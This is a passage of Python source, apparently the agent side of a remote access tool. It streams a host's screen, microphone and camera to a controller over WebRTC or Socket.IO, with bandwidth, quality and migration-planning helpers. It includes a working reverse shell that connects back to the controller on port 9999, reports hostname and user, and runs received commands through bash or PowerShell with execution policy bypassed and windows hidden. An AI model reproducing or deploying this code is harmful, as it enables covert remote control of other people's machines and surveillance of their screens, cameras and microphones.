            return True
        else:
            log_message(f"Failed to stop WebRTC streaming for agent {agent_id}", "error")
            return False
            
    except Exception as e:
        log_message(f"Error stopping WebRTC streaming: {e}", "error")
        return False


def get_webrtc_stats(agent_id):
    """Get WebRTC streaming statistics for the specified agent."""
    stats = {
        'webrtc_enabled': WEBRTC_ENABLED,
        'peer_connection_state': 'disconnected',
        'ice_connection_state': 'disconnected',
        'media_tracks': {}
    }
    
    pc = WEBRTC_PEER_CONNECTIONS.get(agent_id)
    if pc:
        stats['peer_connection_state'] = pc.connectionState
        stats['ice_connection_state'] = pc.iceConnectionState
        
        # Get media track stats
        for key, track in WEBRTC_STREAMS.items():
            if key.startswith(f"{agent_id}_"):
                track_type = key.split('_')[1]
                stats['media_tracks'][track_type] = track.get_stats()
    
    return stats


# ========================================================================================
# WEBRTC OPTIMIZATION AND PERFORMANCE TUNING FUNCTIONS
# ========================================================================================

def estimate_bandwidth(agent_id):
    """Estimate available bandwidth based on WebRTC connection statistics."""
    if not AIORTC_AVAILABLE or agent_id not in WEBRTC_PEER_CONNECTIONS:
        return None
    
    try:
        pc = WEBRTC_PEER_CONNECTIONS[agent_id]
        stats = pc.getStats()
        
        # Extract bandwidth information from RTCStatsReport
        bandwidth_stats = {
            'current_bitrate': 0,  # bits per second
            'available_bandwidth': 0,  # bits per second
            'rtt': 0,
            'packet_loss': 0,
            'jitter': 0
        }
        
        last_bytes = None
        last_ts = None
        for stat in stats.values():
            if hasattr(stat, 'type'):
                if stat.type == 'outbound-rtp':
                    if hasattr(stat, 'bytesSent') and hasattr(stat, 'timestamp'):
                        prev = WEBRTC_BANDWIDTH_TRACK.get(agent_id)
                        if prev:
                            last_bytes = prev.get('bytes')
                            last_ts = prev.get('ts')
                        bytes_sent = int(getattr(stat, 'bytesSent', 0) or 0)
                        ts = float(getattr(stat, 'timestamp', time.time()) or time.time())
                        if last_bytes is not None and last_ts is not None:
                            dt = max(0.001, ts - last_ts)
                            delta_bytes = max(0, bytes_sent - last_bytes)
                            bps = int((delta_bytes * 8) / dt)
                            bandwidth_stats['current_bitrate'] = bps
                        WEBRTC_BANDWIDTH_TRACK[agent_id] = {'bytes': bytes_sent, 'ts': ts}
                elif stat.type == 'candidate-pair':
                    if hasattr(stat, 'currentRtt'):
                        bandwidth_stats['rtt'] = stat.currentRtt * 1000  # Convert to ms
                elif stat.type == 'inbound-rtp':
                    if hasattr(stat, 'packetsLost'):
                        bandwidth_stats['packet_loss'] = stat.packetsLost
        
        # Estimate available bandwidth (simplified algorithm)
        if bandwidth_stats['current_bitrate'] > 0:
            bandwidth_stats['available_bandwidth'] = int(bandwidth_stats['current_bitrate'] * 0.8)
        
        return bandwidth_stats
        
    except Exception as e:
        log_message(f"Error estimating bandwidth for agent {agent_id}: {e}", "error")
        return None


def adaptive_bitrate_control(agent_id, current_quality='auto'):
    """Implement adaptive bitrate control based on bandwidth estimation."""
    if not AIORTC_AVAILABLE or not WEBRTC_CONFIG['adaptive_bitrate']:
        return False
    
    try:
        bandwidth_stats = estimate_bandwidth(agent_id)
        if not bandwidth_stats:
            return False
        
        current_bitrate = bandwidth_stats['current_bitrate']
        available_bandwidth = bandwidth_stats['available_bandwidth']
        
        # Determine optimal quality level
        if available_bandwidth >= WEBRTC_CONFIG['quality_levels']['high']['bitrate']:
            target_quality = 'high'
        elif available_bandwidth >= WEBRTC_CONFIG['quality_levels']['medium']['bitrate']:
            target_quality = 'medium'
        else:
            target_quality = 'low'
        
        # Apply quality changes if needed
        if target_quality != current_quality:
            # Update MediaStreamTrack quality settings
            for key, track in WEBRTC_STREAMS.items():
                if key.startswith(f"{agent_id}_"):
                    if hasattr(track, 'set_quality'):
                        quality_value = WEBRTC_CONFIG['quality_levels'][target_quality]['quality']
                        track.set_quality(quality_value)
                    if hasattr(track, 'set_fps'):
                        fps_value = WEBRTC_CONFIG['quality_levels'][target_quality]['fps']
                        track.set_fps(fps_value)
            
            # Emit quality change event to controller
            if SOCKETIO_AVAILABLE:
                safe_emit('webrtc_quality_change', {  # [ OK ] SAFE
                    'agent_id': agent_id,
                    'old_quality': current_quality,
                    'new_quality': target_quality,
                    'bandwidth_stats': bandwidth_stats
                })
            
            log_message(f"Adaptive bitrate: Changed quality from {current_quality} to {target_quality} for agent {agent_id}")
            return True
        
        return False
        
    except Exception as e:
        log_message(f"Error in adaptive bitrate control for agent {agent_id}: {e}", "error")
        return False


def implement_frame_dropping(agent_id, load_threshold=0.8):
    """Implement intelligent frame dropping under high system load."""
    if not AIORTC_AVAILABLE or not WEBRTC_CONFIG['frame_dropping']:
        return False
    
    try:
        # Check system load using psutil if available
        if PSUTIL_AVAILABLE:
            import psutil
            cpu_percent = psutil.cpu_percent(interval=1)
            memory_percent = psutil.virtual_memory().percent
            
            # Calculate overall system load
            system_load = (cpu_percent + memory_percent) / 200.0  # Normalize to 0-1
            
            if system_load > load_threshold:
                # Implement frame dropping by reducing FPS
                for key, track in WEBRTC_STREAMS.items():
                    if key.startswith(f"{agent_id}_"):
                        if hasattr(track, 'set_fps'):
                            current_fps = getattr(track, '_target_fps', 30)
                            new_fps = max(15, int(current_fps * 0.7))  # Reduce FPS by 30%
                            track.set_fps(new_fps)
                
                # Emit frame dropping event to controller
                if SOCKETIO_AVAILABLE:
                    safe_emit('webrtc_frame_dropping', {  # [ OK ] SAFE
                        'agent_id': agent_id,
                        'system_load': system_load,
                        'load_threshold': load_threshold,
                        'action': 'fps_reduction'
                    })
                
                log_message(f"Frame dropping implemented for agent {agent_id} due to high system load ({system_load:.2f})")
                return True
        
        return False
        
    except Exception as e:
        log_message(f"Error implementing frame dropping for agent {agent_id}: {e}", "error")
        return False


def monitor_connection_quality(agent_id):
    """Monitor and assess WebRTC connection quality."""
    if not AIORTC_AVAILABLE or not WEBRTC_CONFIG['monitoring']['connection_quality_metrics']:
        return None
    
    try:
        bandwidth_stats = estimate_bandwidth(agent_id)
        if not bandwidth_stats:
            return None
        
        # Assess connection quality
        quality_score = 100
        quality_issues = []
        
        # Check bitrate
        if bandwidth_stats['current_bitrate'] < WEBRTC_CONFIG['monitoring']['quality_thresholds']['min_bitrate']:
            quality_score -= 30
            quality_issues.append('low_bitrate')
        
        # Check latency
        if bandwidth_stats['rtt'] > WEBRTC_CONFIG['monitoring']['quality_thresholds']['max_latency']:
            quality_score -= 25
            quality_issues.append('high_latency')
        
        # Check packet loss
        if bandwidth_stats['packet_loss'] > 0:
            quality_score -= 20
            quality_issues.append('packet_loss')
        
        # Check FPS
        current_fps = 30  # Default, should get from actual track
        for key, track in WEBRTC_STREAMS.items():
            if key.startswith(f"{agent_id}_"):
                if hasattr(track, '_target_fps'):
                    current_fps = track._target_fps
                    break
        
        if current_fps < WEBRTC_CONFIG['monitoring']['quality_thresholds']['min_fps']:
            quality_score -= 15
            quality_issues.append('low_fps')
        
        # Log quality assessment
        if WEBRTC_CONFIG['monitoring']['detailed_logging']:
            log_message(f"Connection quality for agent {agent_id}: Score={quality_score}/100, Issues={quality_issues}")
        
        return {
            'quality_score': quality_score,
            'quality_issues': quality_issues,
            'bandwidth_stats': bandwidth_stats,
            'current_fps': current_fps
        }
        
    except Exception as e:
        log_message(f"Error monitoring connection quality for agent {agent_id}: {e}", "error")
        return None


def automatic_reconnection_logic(agent_id):
    """Implement automatic reconnection logic for failed WebRTC connections."""
    if not AIORTC_AVAILABLE or not WEBRTC_CONFIG['monitoring']['automatic_reconnection']:
        return False
    
    try:
        pc = WEBRTC_PEER_CONNECTIONS.get(agent_id)
        if not pc:
            return False
        
        # Check connection state
        if pc.connectionState in ['failed', 'disconnected']:
            log_message(f"WebRTC connection failed for agent {agent_id}, attempting reconnection...")
            
            # Close failed connection
            try:
                run_webrtc_coro(agent_id, close_webrtc_connection(agent_id))
            except Exception as e:
                log_message(f"Error scheduling WebRTC close on loop: {e}", "warning")
            
            # Wait a bit before reconnecting
            time.sleep(2)
            
            # Attempt to recreate connection
            if start_webrtc_streaming(agent_id):
                log_message(f"Automatic reconnection successful for agent {agent_id}")
                return True
            else:
                log_message(f"Automatic reconnection failed for agent {agent_id}", "error")
                return False
        
        return False
        
    except Exception as e:
        log_message(f"Error in automatic reconnection logic for agent {agent_id}: {e}", "error")
        return False
def assess_production_readiness():
    """Assess current implementation readiness for production scale."""
    try:
        current_stats = {
            'webrtc_enabled': WEBRTC_ENABLED,
            'active_connections': len(WEBRTC_PEER_CONNECTIONS),
            'active_streams': len(WEBRTC_STREAMS),
            'aiortc_available': AIORTC_AVAILABLE
        }
        
        # Check against production targets
        readiness_score = 0
        recommendations = []
        
        if current_stats['webrtc_enabled']:
            readiness_score += 25
        else:
            recommendations.append("Enable WebRTC for low-latency streaming")
        
        if current_stats['aiortc_available']:
            readiness_score += 20
        else:
            recommendations.append("Install aiortc for WebRTC support")
        
        if current_stats['active_connections'] > 0:
            readiness_score += 25
        else:
            recommendations.append("Test WebRTC connections with agents")
        
        # Check configuration
        if WEBRTC_CONFIG.get('bandwidth_estimation'):
            readiness_score += 15
        else:
            recommendations.append("Enable bandwidth estimation")
        
        if WEBRTC_CONFIG.get('adaptive_bitrate'):
            readiness_score += 15
        else:
            recommendations.append("Enable adaptive bitrate control")
        
        # Production readiness assessment
        if readiness_score >= 80:
            status = "READY"
        elif readiness_score >= 60:
            status = "NEEDS_IMPROVEMENT"
        else:
            status = "NOT_READY"
        
        return {
            'readiness_score': readiness_score,
            'status': status,
            'current_stats': current_stats,
            'recommendations': recommendations,
            'production_targets': PRODUCTION_SCALE['performance_targets']
        }
        
    except Exception as e:
        log_message(f"Error assessing production readiness: {e}", "error")
        return None


def generate_mediasoup_migration_plan():
    """Generate detailed plan for migrating to mediasoup for production scale."""
    try:
        current_implementation = PRODUCTION_SCALE['current_implementation']
        target_implementation = PRODUCTION_SCALE['target_implementation']
        
        migration_plan = {
            'current_state': current_implementation,
            'target_state': target_implementation,
            'phases': [
                {
                    'phase': 1,
                    'name': 'Preparation and Analysis',
                    'tasks': [
                        'Analyze current aiortc performance bottlenecks',
                        'Set up mediasoup development environment',
                        'Create performance benchmarks and targets',
                        'Design new architecture with mediasoup'
                    ],
                    'estimated_duration': '2-3 weeks',
                    'dependencies': ['Node.js environment', 'mediasoup installation']
                },
                {
                    'phase': 2,
                    'name': 'Core Migration',
                    'tasks': [
                        'Implement mediasoup server (replacing aiortc SFU)',
                        'Migrate agent WebRTC signaling to mediasoup',
                        'Update controller to use mediasoup instead of aiortc',
                        'Implement mediasoup-specific optimizations'
                    ],
                    'estimated_duration': '4-6 weeks',
                    'dependencies': ['Phase 1 completion', 'mediasoup API knowledge']
                },
                {
                    'phase': 3,
                    'name': 'Testing and Optimization',
                    'tasks': [
                        'Performance testing with multiple concurrent agents',
                        'Load testing with hundreds of viewers',
                        'Optimize mediasoup configuration for low latency',
                        'Implement advanced features (simulcast, SVC)'
                    ],
                    'estimated_duration': '2-3 weeks',
                    'dependencies': ['Phase 2 completion', 'test environment']
                },
                {
                    'phase': 4,
                    'name': 'Deployment and Monitoring',
                    'tasks': [
                        'Deploy mediasoup to production environment',
                        'Monitor performance and connection quality',
                        'Implement advanced monitoring and alerting',
                        'Document new architecture and procedures'
                    ],
                    'estimated_duration': '1-2 weeks',
                    'dependencies': ['Phase 3 completion', 'production environment']
                }
            ],
            'benefits': [
                'Scalability: Support for 1000+ concurrent viewers',
                'Performance: Sub-100ms latency achievable',
                'Reliability: Production-grade WebRTC SFU',
                'Features: Advanced simulcast, SVC, and bandwidth adaptation'
            ],
            'risks': [
                'Complexity: mediasoup has steeper learning curve',
                'Dependencies: Requires Node.js ecosystem',
                'Migration time: 2-3 months estimated',
                'Testing: Extensive testing required for production'
            ]
        }
        
        return migration_plan
        
    except Exception as e:
        log_message(f"Error generating mediasoup migration plan: {e}", "error")
        return None


def enhanced_webrtc_monitoring():
    """Enhanced WebRTC monitoring with comprehensive metrics."""
    try:
        monitoring_data = {
            'timestamp': time.time(),
            'overall_status': {
                'webrtc_enabled': WEBRTC_ENABLED,
                'total_agents': len(WEBRTC_PEER_CONNECTIONS),
                'total_streams': len(WEBRTC_STREAMS)
            },
            'per_agent_stats': {},
            'system_metrics': {},
            'quality_metrics': {},
            'scalability_metrics': {}
        }
        
        # Collect per-agent statistics
        for agent_id in WEBRTC_PEER_CONNECTIONS:
            agent_stats = {
                'connection_state': WEBRTC_PEER_CONNECTIONS[agent_id].connectionState,
                'ice_state': WEBRTC_PEER_CONNECTIONS[agent_id].iceConnectionState,
                'bandwidth': estimate_bandwidth(agent_id),
                'quality': monitor_connection_quality(agent_id),
                'streams': {}
            }
            
            # Collect stream statistics
            for key, track in WEBRTC_STREAMS.items():
                if key.startswith(f"{agent_id}_"):
                    stream_type = key.split('_')[1]
                    agent_stats['streams'][stream_type] = {
                        'active': True,
                        'stats': track.get_stats() if hasattr(track, 'get_stats') else {}
                    }
            
            monitoring_data['per_agent_stats'][agent_id] = agent_stats
        
        # Collect system metrics if psutil available
        if PSUTIL_AVAILABLE:
            import psutil
            monitoring_data['system_metrics'] = {
                'cpu_percent': psutil.cpu_percent(interval=1),
                'memory_percent': psutil.virtual_memory().percent,
                'network_io': psutil.net_io_counters()._asdict()
            }
        
        # Calculate overall quality metrics
        quality_scores = []
        for agent_stats in monitoring_data['per_agent_stats'].values():
            if agent_stats['quality']:
                quality_scores.append(agent_stats['quality']['quality_score'])
        
        if quality_scores:
            monitoring_data['quality_metrics'] = {
                'average_quality': sum(quality_scores) / len(quality_scores),
                'min_quality': min(quality_scores),
                'max_quality': max(quality_scores),
                'quality_distribution': {
                    'excellent': len([s for s in quality_scores if s >= 90]),
                    'good': len([s for s in quality_scores if 70 <= s < 90]),
                    'fair': len([s for s in quality_scores if 50 <= s < 70]),
                    'poor': len([s for s in quality_scores if s < 50])
                }
            }
        
        # Calculate scalability metrics
        current_usage = len(WEBRTC_PEER_CONNECTIONS)
        max_capacity = PRODUCTION_SCALE['scalability_limits']['aiortc_max_viewers']
        
        monitoring_data['scalability_metrics'] = {
            'current_usage': current_usage,
            'max_capacity': max_capacity,
            'usage_percentage': (current_usage / max_capacity) * 100 if max_capacity > 0 else 0,
            'scalability_status': 'GOOD' if current_usage < max_capacity * 0.8 else 'WARNING' if current_usage < max_capacity else 'CRITICAL'
        }
        
        # Generate alerts for critical issues
        alerts = []
        if monitoring_data['scalability_metrics']['scalability_status'] == 'CRITICAL':
            alerts.append('CRITICAL: Maximum capacity reached, consider migrating to mediasoup')
        
        if monitoring_data['quality_metrics'].get('average_quality', 100) < 50:
            alerts.append('WARNING: Overall connection quality is poor')
        
        monitoring_data['alerts'] = alerts
        
        return monitoring_data
        
    except Exception as e:
        log_message(f"Error in enhanced WebRTC monitoring: {e}", "error")
        return None


# ========================================================================================
# WEBRTC STREAMING INTEGRATION - REPLACING SOCKET.IO FRAME PIPELINE
# ========================================================================================

def start_webrtc_screen_streaming(agent_id):
    """Start WebRTC screen streaming using MediaStreamTrack instead of Socket.IO."""
    global WEBRTC_STREAMS, WEBRTC_ENABLED
    
    if not AIORTC_AVAILABLE or not WEBRTC_ENABLED:
        log_message("WebRTC not available, falling back to Socket.IO streaming", "warning")
        return stream_screen_h264_socketio(agent_id)
    
    try:
        # Create WebRTC peer connection with screen track
        asyncio.create_task(create_webrtc_peer_connection(
            agent_id, enable_screen=True, enable_audio=True, enable_camera=False
        ))
        
        # Store stream info
        WEBRTC_STREAMS[agent_id] = {
            'type': 'screen',
            'started_at': time.time(),
            'status': 'starting'
        }
        
        log_message(f"Started WebRTC screen streaming for agent {agent_id}")
        return True
        
    except Exception as e:
        log_message(f"Failed to start WebRTC screen streaming: {e}", "error")
        # Fallback to Socket.IO
        return stream_screen_h264_socketio(agent_id)

def start_webrtc_audio_streaming(agent_id):
    """Start WebRTC audio streaming using MediaStreamTrack instead of Socket.IO."""
    global WEBRTC_STREAMS, WEBRTC_ENABLED
    
    if not AIORTC_AVAILABLE or not WEBRTC_ENABLED:
        log_message("WebRTC not available, falling back to Socket.IO streaming", "warning")
        return start_audio_streaming(agent_id)
    
    try:
        # Create WebRTC peer connection with audio track
        loop = ensure_webrtc_loop(agent_id)
        asyncio.run_coroutine_threadsafe(
            create_webrtc_peer_connection(agent_id, enable_screen=False, enable_audio=True, enable_camera=False),
            loop
        )
        
        # Store stream info
        WEBRTC_STREAMS[agent_id] = {
            'type': 'audio',
            'started_at': time.time(),
            'status': 'starting'
        }
        
        log_message(f"Started WebRTC audio streaming for agent {agent_id}")
        return True
        
    except Exception as e:
        log_message(f"Failed to start WebRTC audio streaming: {e}", "error")
        # Fallback to Socket.IO
        return start_audio_streaming(agent_id)

def start_webrtc_camera_streaming(agent_id):
    """Start WebRTC camera streaming using MediaStreamTrack instead of Socket.IO."""
    global WEBRTC_STREAMS, WEBRTC_ENABLED
    
    if not AIORTC_AVAILABLE or not WEBRTC_ENABLED:
        log_message("WebRTC not available, falling back to Socket.IO streaming", "warning")
        return start_camera_streaming(agent_id)
    
    try:
        # Create WebRTC peer connection with camera track
        loop = ensure_webrtc_loop(agent_id)
        asyncio.run_coroutine_threadsafe(
            create_webrtc_peer_connection(agent_id, enable_screen=False, enable_audio=True, enable_camera=True),
            loop
        )
        
        # Store stream info
        WEBRTC_STREAMS[agent_id] = {
            'type': 'camera',
            'started_at': time.time(),
            'status': 'starting'
        }
        
        log_message(f"Started WebRTC camera streaming for agent {agent_id}")
        return True
        
    except Exception as e:
        log_message(f"Failed to start WebRTC camera streaming: {e}", "error")
        # Fallback to Socket.IO
        return start_camera_streaming(agent_id)

def start_webrtc_full_streaming(agent_id):
    """Start WebRTC full streaming (screen + audio + camera) using MediaStreamTrack."""
    global WEBRTC_STREAMS, WEBRTC_ENABLED
    
    if not AIORTC_AVAILABLE or not WEBRTC_ENABLED:
        log_message("WebRTC not available, falling back to Socket.IO streaming", "warning")
        start_streaming(agent_id)
        start_audio_streaming(agent_id)
        start_camera_streaming(agent_id)
        return False
    
    try:
        # Create WebRTC peer connection with all tracks
        asyncio.create_task(create_webrtc_peer_connection(
            agent_id, enable_screen=True, enable_audio=True, enable_camera=True
        ))
        
        # Store stream info
        WEBRTC_STREAMS[agent_id] = {
            'type': 'full',
            'started_at': time.time(),
            'status': 'starting'
        }
        
        log_message(f"Started WebRTC full streaming for agent {agent_id}")
        return True
        
    except Exception as e:
        log_message(f"Failed to start WebRTC full streaming: {e}", "error")
        # Fallback to Socket.IO
        start_streaming(agent_id)
        start_audio_streaming(agent_id)
        start_camera_streaming(agent_id)
        return False

def stop_webrtc_streaming_by_type(agent_id, stream_type=None):
    """Stop WebRTC streaming for specific type or all types."""
    global WEBRTC_STREAMS, WEBRTC_PEER_CONNECTIONS
    
    if agent_id not in WEBRTC_STREAMS:
        return False
    
    try:
        if stream_type is None or WEBRTC_STREAMS[agent_id]['type'] == stream_type:
            # Close WebRTC connection
            try:
                run_webrtc_coro(agent_id, close_webrtc_connection(agent_id))
            except Exception as e:
                log_message(f"Error scheduling WebRTC close on loop: {e}", "warning")
            
            # Remove from tracking
            if agent_id in WEBRTC_STREAMS:
                del WEBRTC_STREAMS[agent_id]
            
            log_message(f"Stopped WebRTC {stream_type or 'all'} streaming for agent {agent_id}")
            return True
            
    except Exception as e:
        log_message(f"Failed to stop WebRTC streaming: {e}", "error")
    
    return False

def get_webrtc_streaming_status(agent_id):
    """Get current WebRTC streaming status for an agent."""
    global WEBRTC_STREAMS, WEBRTC_PEER_CONNECTIONS
    
    if agent_id not in WEBRTC_STREAMS:
        return {'status': 'not_streaming'}
    
    stream_info = WEBRTC_STREAMS[agent_id].copy()
    
    # Add peer connection status
    if agent_id in WEBRTC_PEER_CONNECTIONS:
        pc = WEBRTC_PEER_CONNECTIONS[agent_id]
        stream_info['connection_state'] = pc.connectionState
        stream_info['ice_connection_state'] = pc.iceConnectionState
        stream_info['ice_gathering_state'] = pc.iceGatheringState
    
    return stream_info

def switch_to_webrtc_streaming(agent_id, stream_type='screen'):
    """Switch from Socket.IO to WebRTC streaming for the specified type."""
    global STREAMING_ENABLED, AUDIO_STREAMING_ENABLED, CAMERA_STREAMING_ENABLED
    
    if not AIORTC_AVAILABLE or not WEBRTC_ENABLED:
        log_message("WebRTC not available, cannot switch streaming method", "warning")
        return False
    
    try:
        # Stop current Socket.IO streaming
        if stream_type == 'screen' and STREAMING_ENABLED:
            stop_streaming()
        elif stream_type == 'audio' and AUDIO_STREAMING_ENABLED:
            stop_audio_streaming()
        elif stream_type == 'camera' and CAMERA_STREAMING_ENABLED:
            stop_camera_streaming()
        
        # Start WebRTC streaming
        if stream_type == 'screen':
            return start_webrtc_screen_streaming(agent_id)
        elif stream_type == 'audio':
            return start_webrtc_audio_streaming(agent_id)
        elif stream_type == 'camera':
            return start_webrtc_camera_streaming(agent_id)
        elif stream_type == 'full':
            return start_webrtc_full_streaming(agent_id)
        
    except Exception as e:
        log_message(f"Failed to switch to WebRTC streaming: {e}", "error")
        return False
    
    return False

def switch_to_socketio_streaming(agent_id, stream_type='screen'):
    """Switch from WebRTC to Socket.IO streaming for the specified type."""
    try:
        # Stop WebRTC streaming
        stop_webrtc_streaming_by_type(agent_id, stream_type)
        
        # Start Socket.IO streaming
        if stream_type == 'screen':
            return stream_screen_h264_socketio(agent_id)
        elif stream_type == 'audio':
            return start_audio_streaming(agent_id)
        elif stream_type == 'camera':
            return start_camera_streaming(agent_id)
        elif stream_type == 'full':
            stream_screen_h264_socketio(agent_id)
            start_audio_streaming(agent_id)
            start_camera_streaming(agent_id)
            return True
        
    except Exception as e:
        log_message(f"Failed to switch to Socket.IO streaming: {e}", "error")
        return False
    
    return False

# ========================================================================================
# ENHANCED STREAMING FUNCTIONS WITH WEBRTC INTEGRATION
# ========================================================================================

# stream_screen_webrtc_or_socketio is defined later after stream_screen_h264_socketio (line ~11870)

def stream_audio_webrtc_or_socketio(agent_id):
    """Smart audio streaming that automatically chooses WebRTC or Socket.IO based on availability."""
    if AIORTC_AVAILABLE and WEBRTC_ENABLED:
        log_message("Using WebRTC for audio streaming (low latency)")
        return start_webrtc_audio_streaming(agent_id)
    else:
        log_message("Using Socket.IO for audio streaming (fallback mode)")
        return start_audio_streaming(agent_id)

def stream_camera_webrtc_or_socketio(agent_id):
    """Smart camera streaming that automatically chooses WebRTC or Socket.IO based on availability."""
    if AIORTC_AVAILABLE and WEBRTC_ENABLED:
        log_message("Using WebRTC for camera streaming (low latency)")
        return start_webrtc_camera_streaming(agent_id)
    else:
        log_message("Using Socket.IO for camera streaming (fallback mode)")
        return start_camera_streaming(agent_id)

def stream_full_webrtc_or_socketio(agent_id):
    """Smart full streaming that automatically chooses WebRTC or Socket.IO based on availability."""
    if AIORTC_AVAILABLE and WEBRTC_ENABLED:
        log_message("Using WebRTC for full streaming (sub-second latency)")
        return start_webrtc_full_streaming(agent_id)
    else:
        log_message("Using Socket.IO for full streaming (fallback mode)")
        start_streaming(agent_id)
        start_audio_streaming(agent_id)
        start_camera_streaming(agent_id)
        return False


# --- Reverse Shell Functions ---

def reverse_shell_handler(agent_id):
    """
    Handles reverse shell connections and command execution.
    This function runs in a separate thread.
    """
    global REVERSE_SHELL_ENABLED, REVERSE_SHELL_SOCKET
    
    try:
        # Create socket connection back to controller
        REVERSE_SHELL_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Parse SERVER_URL properly
        try:
            if SERVER_URL.startswith("https://"):
                controller_host = SERVER_URL.split("://")[1].split(":")[0].split("/")[0]
            elif SERVER_URL.startswith("http://"):
                controller_host = SERVER_URL.split("://")[1].split(":")[0].split("/")[0]
            else:
                # Assume it's just a hostname
                controller_host = SERVER_URL.split(":")[0].split("/")[0]
        except Exception as e:
            log_message(f"Error parsing SERVER_URL: {e}")
            controller_host = "localhost"  # Fallback
        
        controller_port = 9999  # Dedicated port for reverse shell
        
        log_message(f"Attempting reverse shell connection to {controller_host}:{controller_port}")
        
        # Set socket timeout
        REVERSE_SHELL_SOCKET.settimeout(10)
        REVERSE_SHELL_SOCKET.connect((controller_host, controller_port))
        log_message(f"Reverse shell connected to {controller_host}:{controller_port}")
        
        # Send initial connection info
        system_info = {
            "agent_id": agent_id,
            "hostname": socket.gethostname(),
            "platform": os.name,
            "cwd": os.getcwd(),
            "user": os.getenv("USER") or os.getenv("USERNAME") or "unknown"
        }
        REVERSE_SHELL_SOCKET.send(json.dumps(system_info).encode() + b'\n')
        
        while REVERSE_SHELL_ENABLED:
            try:
                # Receive command from controller
                data = REVERSE_SHELL_SOCKET.recv(4096)
                if not data:
                    log_message("No data received from controller, breaking connection")
                    break
                    
                command = data.decode().strip()
                if not command:
                    continue
                    
                log_message(f"Received command: {command}")
                
                # Handle special commands
                if command.lower() == "exit":
                    log_message("Received exit command")
                    break
                elif command.startswith("cd "):
                    try:
                        path = command[3:].strip()
                        os.chdir(path)
                        response = f"Changed directory to: {os.getcwd()}\n"
                    except Exception as e:
                        response = f"cd error: {str(e)}\n"
                else:
                    # Execute regular command
                    try:
                        if WINDOWS_AVAILABLE:
                            # Get CMD.exe path
                            cmd_exe_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'cmd.exe')
                            
                            # Check if it's a PowerShell command
                            powershell_indicators = ['Get-', 'Set-', 'New-', 'Remove-', 'Start-', 'Stop-', '$']
                            is_powershell = any(indicator in command for indicator in powershell_indicators)
                            
                            if is_powershell or command.strip().lower().startswith('powershell'):
                                # Use PowerShell with proper formatting
                                ps_exe_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 
                                                          'WindowsPowerShell', 'v1.0', 'powershell.exe')
                                
                                # Add Out-String -Width 200 to preserve formatting
                                if '| Out-String' not in command:
                                    formatted_command = f"{command} | Out-String -Width 200"
                                else:
                                    formatted_command = command
                                
                                result = subprocess.run(
                                    [ps_exe_path, "-NoProfile", "-Command", formatted_command],
                                    capture_output=True,
                                    text=False,  # Get bytes for proper encoding
                                    timeout=30,
                                    creationflags=subprocess.CREATE_NO_WINDOW
                                )
                            else:
                                # Use CMD.exe with proper encoding
                                result = subprocess.run(
                                    [ps_exe_path, "-ExecutionPolicy", "Bypass", "-NoProfile", "-Command", command],
                                    capture_output=True,
                                    text=False,  # Get bytes for proper encoding
                                    timeout=30,
                                    creationflags=subprocess.CREATE_NO_WINDOW
                                )
                            
                            # Decode output properly
                            try:
                                stdout = result.stdout.decode('utf-8', errors='replace')
                                stderr = result.stderr.decode('utf-8', errors='replace')
                            except:
                                try:
                                    stdout = result.stdout.decode('cp437', errors='replace')
                                    stderr = result.stderr.decode('cp437', errors='replace')
                                except:
                                    stdout = result.stdout.decode('cp1252', errors='replace')
                                    stderr = result.stderr.decode('cp1252', errors='replace')
                            
                            response = stdout + stderr
                        else:
                            # Linux/Unix
                            result = subprocess.run(
                                ["bash", "-c", command],
                                capture_output=True,
                                text=True,
                                timeout=30
                            )
                            response = result.stdout + result.stderr
                        
                        if not response or not response.strip():
                            response = "[Command executed successfully - no output]\n"
                    except subprocess.TimeoutExpired:
                        response = "[Command timed out after 30 seconds]\n"
                    except Exception as e:
                        response = f"[Command execution error: {str(e)}]\n"
                
                # Send response back
                try:
                    REVERSE_SHELL_SOCKET.send(response.encode())
                except Exception as e:
                    log_message(f"Error sending response: {e}")
                    break
                
            except socket.timeout:
                continue
            except Exception as e:
                log_message(f"Reverse shell error: {e}")
                break
                
    except Exception as e:
        log_message(f"Reverse shell connection error: {e}")
    finally:
        if REVERSE_SHELL_SOCKET:
            try:
                REVERSE_SHELL_SOCKET.close()
            except:
                pass
        REVERSE_SHELL_SOCKET = None
        log_message("Reverse shell disconnected")

def start_reverse_shell(agent_id):
    """Start the reverse shell connection."""
    global REVERSE_SHELL_ENABLED, REVERSE_SHELL_THREAD
    
    with _reverse_shell_lock:  # [ OK ] THREAD-SAFE: Prevent race condition
        if REVERSE_SHELL_ENABLED:
            log_message("Reverse shell already running", "warning")
            return
        
        REVERSE_SHELL_ENABLED = True
        REVERSE_SHELL_THREAD = threading.Thread(target=reverse_shell_handler, args=(agent_id,))
        REVERSE_SHELL_THREAD.daemon = True
        REVERSE_SHELL_THREAD.start()
        log_message("Started reverse shell.")

def stop_reverse_shell():
    """Stop the reverse shell connection."""
    global REVERSE_SHELL_ENABLED, REVERSE_SHELL_THREAD, REVERSE_SHELL_SOCKET
    
    with _reverse_shell_lock:  # [ OK ] THREAD-SAFE
        if not REVERSE_SHELL_ENABLED:
            return
        
        REVERSE_SHELL_ENABLED = False
        if REVERSE_SHELL_SOCKET:
            try:
                REVERSE_SHELL_SOCKET.close()
            except:
                pass
        # Don't join - daemon thread will exit naturally (prevents blocking)
        REVERSE_SHELL_THREAD = None
        log_message("Stopped reverse shell.")
# --- Voice Control Functions ---
def voice_control_handler(agent_id):
    """
    Handles voice recognition and command processing.
    This function runs in a separate thread.
    """
    global VOICE_CONTROL_ENABLED, VOICE_RECOGNIZER
    
    if not SPEECH_RECOGNITION_AVAILABLE:
        log_message("Speech recognition not available - install speechrecognition library")
        return
    
    VOICE_RECOGNIZER = sr.Recognizer()
    microphone = sr.Microphone()
    
    # Adjust for ambient noise
    with microphone as source:
        log_message("Adjusting for ambient noise... Please wait.")
        VOICE_RECOGNIZER.adjust_for_ambient_noise(source)
        log_message("Voice control ready. Listening for commands...")
    
    while VOICE_CONTROL_ENABLED:
        try:
            with microphone as source:
                # Listen for audio with timeout
                audio = VOICE_RECOGNIZER.listen(source, timeout=1, phrase_time_limit=5)
            
            try:
                # Recognize speech using Google Speech Recognition
                command = VOICE_RECOGNIZER.recognize_google(audio).lower()
                log_message(f"Voice command received: {command}")
                
                # Process voice commands
                if "screenshot" in command or "screen shot" in command:
                    execute_voice_command("screenshot", agent_id)
